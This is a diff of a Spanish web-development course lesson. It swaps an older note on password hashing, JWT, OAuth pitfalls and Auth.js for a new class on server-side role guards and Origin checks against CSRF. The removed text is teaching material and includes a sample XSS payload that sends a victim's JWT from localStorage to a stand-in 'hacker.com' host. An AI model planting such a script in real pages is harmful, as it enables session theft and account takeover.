@@ -1,161 +1,106 @@
-# Día 9: Backend VI - Seguridad, Autenticación y Prevención de Hackeos
-
-Hasta ahora, nuestra API confía ciegamente en quien le hace peticiones. Si alguien envía un `DELETE /api/users/1`, el servidor obedece. En el mundo real, un backend sin autenticación es un blanco que será vulnerado en cuestión de minutos.
-
-Hoy exploraremos los mecanismos de seguridad, haciendo énfasis en **qué pasa cuando se configuran mal y cómo los atacantes explotan esos errores**.
-
+---
+tipo: clase
+clase: 9
+semana: 2
+duracion_minutos: 90
+proyecto: Discoteca
+tags:
+  - curso/fullstack
+  - semana/2
 ---
 
-## 1. El Peligro de las Credenciales Propias
+# Clase 9 — Autorización y protección de operaciones
 
-La forma más básica de autenticación es pedir un correo y una contraseña. Sin embargo, es la que más dolores de cabeza trae si se hace mal.
+[[README|Inicio]] · [[Semana2/INDICE|Semana 2]] · ← [[Semana2/CLASE 8|Clase 8]] · [[Semana2/CLASE 10|Clase 10]] →
 
-### El Error (Lo que hace un novato):
-Guardar contraseñas en texto plano en la base de datos (ej. `password: "gatito123"`).
-**El Ataque:** Si un hacker encuentra una vulnerabilidad (como una inyección SQL en un sistema antiguo, o simplemente roba un respaldo de la base de datos), obtiene acceso inmediato a las cuentas de todos los usuarios. Peor aún, como la gente recicla contraseñas, el hacker ahora tiene acceso a sus correos y cuentas bancarias.
+> [!abstract] Objetivo
+> Verificar identidad y permisos en cada operación del backend.
 
-### El Error Intermedio:
-Usar algoritmos de *hashing* obsoletos como MD5 o SHA-1.
-**El Ataque:** Los hackers usan "Rainbow Tables" (bases de datos gigantes con billones de contraseñas ya convertidas a MD5). Si tu hash MD5 se filtra, lo descifran en milisegundos.
+## Antes de empezar
 
-### La Solución Definitiva (Bcrypt / Argon2):
-Antes de que nuestro Servicio (Día 7) guarde al usuario usando Prisma, debemos aplicar un algoritmo de hashing moderno con un **"Salt"** (texto aleatorio que se añade a la contraseña antes de encriptarla). 
+Repasa [[Semana2/CLASE 8|Clase 8]] y completa su tarea. Consulta [[Recursos/Stack y entorno|Stack y entorno]] y [[Proyecto/1. Sistema de Gestion de Discoteca|Proyecto Discoteca]].
 
-```typescript
-// userService.ts
-import bcrypt from 'bcrypt';
-import prisma from '@/lib/prisma';
+## Desarrollo de la clase
 
-export const createUser = async (data) => {
-  // 1. Generamos un hash seguro con 12 rondas de encriptación (muy lento para fuerza bruta)
-  const hashedPassword = await bcrypt.hash(data.password, 12);
-  
-  // 2. Guardamos el hash, NUNCA la contraseña original
-  const newUser = await prisma.user.create({
-    data: {
-      email: data.email,
-      password: hashedPassword,
-    }
+### Autenticar no equivale a autorizar
+
+Saber quién inició sesión no permite asumir que puede editar eventos o administrar usuarios. Consultar la matriz de permisos en [[Proyecto/4. Arquitectura vertical y contratos|contratos y permisos]]. No confiar en un `userId` o `role` enviado por el navegador.
+
+### Guard común: identidad vigente desde la base
+
+```ts
+// src/shared/lib/permissions.ts (función pura, también comprobable con Vitest)
+export type Role = "ADMIN" | "STAFF";
+export function canAccess(role: Role, allowed: readonly Role[]) {
+  return allowed.includes(role);
+}
+```
+
+```ts
+// src/shared/lib/access.ts
+import "server-only";
+import { auth } from "@/auth";
+import { prisma } from "@/shared/lib/prisma";
+import { ApiError } from "./api-error";
+import { canAccess, type Role } from "./permissions";
+export async function requireRoles(allowed: readonly Role[]) {
+  const session = await auth();
+  if (!session?.user.id) throw new ApiError(401, "Inicia sesión");
+  const user = await prisma.user.findUnique({
+    where: { id: session.user.id },
+    select: { id: true, role: true, active: true },
   });
-  return newUser;
-};
+  if (!user || !user.active) throw new ApiError(401, "Sesión no válida");
+  if (!canAccess(user.role, allowed)) throw new ApiError(403, "Sin permiso");
+  return user;
+}
 ```
 
-## 2. Sesiones vs JWT: ¿Dónde guardamos la llave?
+Esto permite que desactivar una cuenta o cambiar su rol tenga efecto sin esperar a que expire el JWT. El ID de sesión identifica; la base decide los privilegios actuales.
 
-Una vez que el usuario ingresa su correo y contraseña correcta, no podemos pedirle que lo haga en cada clic. Necesitamos darle un "pase VIP". Aquí entran las Sesiones y los JWT (JSON Web Tokens).
-clx_role_id_aqui
-### A. JWT (JSON Web Token)
+### Cerrar las rutas que construimos localmente
 
-Un JWT es un string codificado en 3 partes que contiene información del usuario (Payload) y está firmado criptográficamente por el servidor (Signature).
+Importar `requireRoles` en el controlador de eventos de la clase 6. Insertar `await requireRoles(["ADMIN"])` al principio de `postEvent`, y `await requireRoles(["ADMIN", "STAFF"])` al principio de `getEvents`. Repetir en PATCH y DELETE según la matriz.
 
-- **El Error de Configuración:** Usar una clave secreta débil (ej. `JWT_SECRET="12345"`).
-    
-- **El Ataque (JWT Forgery):** Un hacker toma su token, decodifica el Payload (que es público), cambia su `"role": "USER"` a `"role": "ADMIN"`. Como adivinó tu clave "12345", vuelve a firmar el token. ¡Felicidades, acabas de darle control total de tu sistema a un atacante!
-    
-- **La Prevención:** Usar cadenas criptográficas largas y aleatorias (ej. generadas con `openssl rand -base64 64`) en tu `.env`.
-    
+El actor de una venta se obtiene del guard: `const actor = await requireRoles(["ADMIN", "STAFF"])`. Asignar `createdById: actor.id` en servidor. Para recursos que sean privados por usuario, filtrar también por propietario dentro de la consulta.
 
-### B. El Peligro del `localStorage` (Ataques XSS)
+### Middleware/Proxy y vistas
 
-- **El Error:** Cuando el backend genera el JWT, el frontend lo guarda en el `localStorage` del navegador para enviarlo en cada petición.
-    
-- **El Ataque (XSS - Cross-Site Scripting):** Si tu foro permite comentarios, un hacker escribe un comentario con código JavaScript oculto: `<script>fetch("http://hacker.com?token=" + localStorage.getItem("jwt"))</script>`. Cuando un Administrador lee ese comentario, su navegador ejecuta el código y le envía el JWT al hacker. (Robo de sesión).
-    
+En Next.js 16 la convención se llama `proxy.ts`. Puede servir para redirigir pronto, pero no lo necesitamos para la garantía de permisos: el guard debe permanecer en los endpoints. No afirmar que ocultar un botón protege una operación. Una API responde 401/403 JSON, no HTML de login como si fuera un resultado correcto.
 
-### C. La Solución: Cookies `HttpOnly`
+Las operaciones por cookies también necesitan protección ante CSRF: en las rutas de mutación propias comprobar `Origin` contra el origen configurado y rechazar orígenes ajenos antes de ejecutar cambios. Auth.js gestiona su propio flujo; no copiar ese supuesto a nuestras APIs.
 
-Para evitar el XSS, el backend debe enviar el JWT (o el ID de sesión) dentro de una Cookie con las banderas `HttpOnly` y `Secure`.
-
-- `HttpOnly`: El navegador oculta la cookie de JavaScript. El ataque XSS del paso anterior ahora devolverá `null`.
-    
-- `Secure`: Solo viaja por HTTPS, evitando que te roben el token si usas WiFi público.
-    HTTPS
-
----
-
-## 3. Proveedores OAuth (Google, GitHub)
-
-En lugar de manejar contraseñas, delegamos la seguridad a gigantes tecnológicos.
-
-- **El Error de Configuración:** No validar estrictamente las URLs de redirección (`Callback URIs`) en el panel de Google Cloud o GitHub Developer.
-    
-- **El Ataque (Open Redirect / Token Leakage):** Un atacante crea un enlace que inicia sesión con tu App, pero modifica el parámetro `redirect_uri` hacia su propio servidor. El usuario se autentica en Google, y Google envía el token de acceso al servidor del atacante en lugar de al tuyo.
-    
-- **La Prevención:** Configurar listas blancas estrictas en los paneles de los proveedores (ej. solo permitir `https://midominio.com/api/auth/callback/google`).
-    
-
----
-
-## 4. Integración de NextAuth.js (Auth.js)
-
-Implementar Cookies Seguras, rotación de tokens, protección CSRF y encriptación manualmente es reinventar la rueda (y probablemente dejar huecos de seguridad). En el ecosistema Next.js, usamos **NextAuth.js (ahora Auth.js)**.
-
-Auth.js soluciona el 99% de las vulnerabilidades mencionadas automáticamente (usa JWT encriptados por defecto y los guarda en cookies `HttpOnly`).
-
-## Configuración Base (`app/api/auth/[...nextauth]/route.ts`)
-
-Este archivo es un "Catch-all Route" que manejará todo: el login, el logout y los callbacks de OAuth.
-
-```TypeScript
-import NextAuth from "next-auth";
-import CredentialsProvider from "next-auth/providers/credentials";
-import GoogleProvider from "next-auth/providers/google";
-import bcrypt from 'bcrypt';
-import prisma from '@/lib/prisma';
-
-const handler = NextAuth({
-  // 1. Configuración de Sesión Estratégica
-  session: { strategy: "jwt" }, // Usamos JWT seguros
-  
-  // 2. Definición de Proveedores
-  providers: [
-    GoogleProvider({
-      clientId: process.env.GOOGLE_CLIENT_ID!,
-      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
-    }),
-    CredentialsProvider({
-      name: "Credenciales",
-      credentials: {
-        email: { label: "Email", type: "email" },
-        password: { label: "Password", type: "password" }
-      },
-      // 3. Lógica de Autorización Segura
-      async authorize(credentials) {
-        if (!credentials?.email || !credentials?.password) return null;
-
-        const user = await prisma.user.findUnique({
-          where: { email: credentials.email }
-        });
-
-        if (!user || !user.password) return null; // Evitamos revelar si el usuario existe o no
-
-        // Comparamos el hash de forma segura
-        const isPasswordValid = await bcrypt.compare(credentials.password, user.password);
-
-        if (!isPasswordValid) return null;
-
-        // Si todo es correcto, devolvemos los datos no sensibles
-        return { id: user.id, name: user.name, email: user.email, role: user.role };
-      }
-    })
-  ],
-  
-  // 4. EL PASO MÁS IMPORTANTE PARA EVITAR HACKEOS
-  // Esta clave firma los tokens. ¡Debe ser larga y secreta!
-  secret: process.env.NEXTAUTH_SECRET,
-});
-
-export { handler as GET, handler as POST };
+```ts
+export function requireSameOrigin(request: Request) {
+  const expected = process.env.APP_ORIGIN;
+  if (!expected || request.headers.get("origin") !== new URL(expected).origin)
+    throw new ApiError(403, "Origen no permitido");
+}
 ```
->[!TIP] Tip de Seguridad Crítico: 
->En tu archivo `.env`, NUNCA dejes `NEXTAUTH_SECRET` vacío o con una cadena simple. Genera uno seguro corriendo este comando en tu terminal: `npx auth secret`.
+
+Integrar esta función (con import de `ApiError`) en POST/PATCH/DELETE propios. Las pruebas con curl incluyen `Origin: http://localhost:3000`. Los clientes externos necesitarían un contrato de autenticación diferente.
+
+## Práctica guiada
+
+Intentar crear un evento sin sesión, con STAFF y con ADMIN. Verificar 401, 403 y 201.
+
+## Tarea para casa
+
+Aplicar guards y origen a todas las operaciones de tu módulo. Revisar el PR de otro equipo intentando saltarse su interfaz.
+
+## Criterios de finalización
+
+- [ ] Cada operación comprueba permisos en servidor.
+- [ ] La identidad del actor proviene de la sesión.
+- [ ] Se prueban peticiones directas y origen ajeno.
+
+## Conexiones
+
+[[Semana2/CLASE 8|Clase 8]] · [[Semana2/CLASE 10|Clase 10]] · [[Proyecto/4. Arquitectura vertical y contratos|Arquitectura vertical]] · [[Proyecto/5. Evaluacion y entregables|Evaluación y entregables]]
+
+> [!tip] Distribución orientativa de los 90 minutos
+> 10 min de repaso, 20 de explicación, 50 de práctica y 10 de cierre. El trabajo del módulo continúa en casa.
 
 ---
 
-## Resumen del Día 9
-
-Hoy aprendimos que la seguridad no es un feature extra, es la base de la aplicación.
-- Vimos cómo un `localStorage` puede ser víctima de un ataque XSS y por qué usamos cookies `HttpOnly`.
-- Entendimos la importancia de hacer _hash_ a las contraseñas para proteger los datos de nuestros usuarios incluso si nos vulneran.
-- Integramos **Auth.js** para delegar la complejidad criptográfica a una librería testeada por la comunidad y asegurar la plataforma con estándares de la industria.
+[[README|Inicio]] · [[Semana2/INDICE|Semana 2]] · ← [[Semana2/CLASE 8|Clase 8]] · [[Semana2/CLASE 10|Clase 10]] →
